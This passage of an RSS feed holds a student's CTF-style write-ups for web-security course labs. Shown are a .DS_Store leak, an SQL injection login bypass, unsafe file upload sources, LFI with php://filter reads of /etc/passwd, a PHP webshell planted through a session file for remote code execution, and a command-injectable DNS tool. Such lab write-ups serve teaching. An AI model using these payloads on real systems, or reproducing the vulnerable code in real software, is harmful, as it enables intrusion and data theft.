&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/lijiejie/ds_store_exp.git
$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
[200] http://h4ck3r.quest:9001/index.php
$ cd h4ck3r.quest_9001
$ cat super_secret_meowmeow.php
FLAG{.DS_Store is so annoying lmao}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, must install &lt;code>python 2&lt;/code>, &lt;code>requests&lt;/code>, &lt;code>ds_store&lt;/code> and modify &lt;code>queue&lt;/code>(&lt;code>import queue&lt;/code>→&lt;code>import Queue as queue&lt;/code>)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py2.7 python=2.7
$ conda install -c auto ds_store
$ conda install -c anaconda requests
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
 Simple Web 0x03(Lab - Log me in + Revenge)
 &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - &lt;code>SQLi&lt;/code>
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h2 id="revenge-source-code">
 Revenge source code
 &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is None:
 db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
 db.row_factory = sqlite3.Row
 return db


@app.before_first_request
def init_db():
 cursor = get_db().cursor()
 cursor.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
 &amp;#34;username&amp;#34; TEXT NOT NULL,
 &amp;#34;password&amp;#34; TEXT NOT NULL
 )
 &amp;#34;&amp;#34;&amp;#34;)
 cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
 count = cursor.fetchone()[&amp;#39;count&amp;#39;]
 if count == 0:
 import secrets
 cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
 (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
 get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is not None:
 db.close()


@app.route(&amp;#34;/&amp;#34;)
def home():
 return render_template(&amp;#34;index.html&amp;#34;,
 failed=request.args.get(&amp;#39;failed&amp;#39;) != None)


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 username = request.form.get(&amp;#39;username&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;)

 if not username or not password:
 return redirect(&amp;#34;/?failed&amp;#34;)

 cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
 res = cur.fetchone()
 cur.close()

 if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
 return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;

 return redirect(&amp;#34;/?failed&amp;#34;)



@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
 Simple Web 0x04(Lab - Image Space 0x01)
 &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9010">http://h4ck3r.quest:9010&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;!-- upload form --&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
 Simple Web 0x05(Lab - Image Space 0x02)
 &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9011">http://h4ck3r.quest:9011&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
 Simple Web 0x06(Lab - Image Space 0x03)
 &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9012">http://h4ck3r.quest:9012&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 if (in_array($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;type&amp;#39;], [&amp;#34;image/png&amp;#34;, &amp;#34;image/jpeg&amp;#34;, &amp;#34;image/jpg&amp;#34;]) === false) {
 die(&amp;#34;Invalid file type: &amp;#34; . $_SERVER[&amp;#34;CONTENT_TYPE&amp;#34;]);
 }

 list($_, $_, $type) = getimagesize($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]);

 if ($type !== IMAGETYPE_JPEG &amp;amp;&amp;amp; $type !== IMAGETYPE_PNG) {
 die(&amp;#34;Invalid image type.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::
It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
 Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
&lt;h2 id="exploit---lfi-to-rce">
 Exploit - LFI to RCE
 &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
&lt;li>&lt;code>webshell&lt;/code>
&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
↓
&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
↓
&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
&lt;li>Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
 Simple Web 0x08(Lab - My First Meow Website)
 &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
Target: Login as Admin&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Observe
According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
&lt;li>Use &lt;code>php://filter&lt;/code> to read page
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
:::spoiler page source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
 Home
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
 About
 &amp;lt;/a&amp;gt;
 &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
 Admin
 &amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/nav&amp;gt;

 &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
 &amp;lt;?php
 if (isset($_GET[&amp;#39;page&amp;#39;]))
 include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
 else
 include(&amp;#34;inc/home.php&amp;#34;);
 ?&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Observe page source code
We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
:::spoiler admin source code
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
&amp;lt;form&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php
$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
if (
 isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
 $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
) {
 echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
}

?&amp;gt;
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
 Simple Web 0x09(Lab - DNS Lookup Tool)
 &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8300/">http://h4ck3r.quest:8300/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;) ?&amp;gt;&amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a id=&amp;#34;magic&amp;#34;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;article class=&amp;#34;message is-link is-hidden is-size-4&amp;#34; id=&amp;#34;hint&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;message-body is-family-monospace&amp;#34;&amp;gt;
 host &amp;#39;&amp;lt;span class=&amp;#34;has-text-danger&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
 &amp;lt;/div&amp;gt;
 &amp;lt;/article&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;

 &amp;lt;script&amp;gt;
 magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;#34;is-hidden&amp;#34;);
 window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
 &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
